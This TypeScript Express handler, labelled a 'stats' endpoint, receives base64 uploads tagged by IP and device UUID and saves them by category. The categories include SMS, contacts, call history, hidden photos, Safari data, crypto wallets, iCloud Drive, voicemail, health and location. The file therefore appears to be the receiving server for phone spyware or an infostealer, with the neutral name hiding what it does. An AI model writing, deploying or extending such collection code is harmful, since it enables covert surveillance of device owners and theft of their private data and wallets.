import type { Request, Response } from "express";
import type { Logger } from "pino";
import { writeFileSync, mkdirSync } from "node:fs";
import { join } from "node:path";
import { safeFilename, timestamp } from "../utils.ts";

export interface StatsContext {
  logger: Logger;
  dataDir: string;
}

export async function handleStats(
  req: Request,
  res: Response,
  ctx: StatsContext
): Promise<void> {
  try {
    const body = req.body as Record<string, unknown>;
    const ip = req.ip ?? "unknown";
    const ts = timestamp();
    const category = safeFilename((body.category as string) ?? "unknown");

    const base = join(ctx.dataDir, safeFilename(ip), "stats");

    const payload = {
      time: ts,
      ip,
      deviceUUID: req.get("x-device-uuid") ?? "unknown",
      category,
      path: (body.path as string) ?? "",
      description: (body.description as string) ?? "",
      dataLength: 0,
    };

    const dataStr = body.data as string;
    if (dataStr) {
      payload.dataLength = Buffer.from(dataStr, "base64").length;
      const ext = extFromCategory(category);
      const filename = `${ts}__${safeFilename((body.path as string) ?? "file")}${ext}`;
      mkdirSync(join(base, category), { recursive: true });
      writeFileSync(join(base, category, filename), Buffer.from(dataStr, "base64"));
      ctx.logger.info({ ip, category, filename, size: payload.dataLength }, "file saved");
    }

    mkdirSync(base, { recursive: true });
    writeFileSync(join(base, `${category}.jsonl`), JSON.stringify(payload) + "\n", { flag: "a" });
    ctx.logger.info({ ip, category }, "stats received");
    res.status(200).send("OK");
  } catch (err) {
    ctx.logger.error({ err }, "stats handler error");
    res.status(500).send("Internal Server Error");
  }
}

function extFromCategory(category: string): string {
  const map: Record<string, string> = {
    sms: ".json",
    contacts: ".json",
    callhistory: ".json",
    photos: ".jpg",
    screenshots: ".png",
    "hidden-photos": ".jpg",
    "app-support": "",
    "safari-data": ".json",
    "crypto-wallets": ".json",
    "icloud-drive": "",
    voicemail: ".m4a",
    health: ".json",
    location: ".json",
  };
  return map[category] ?? ".bin";
}
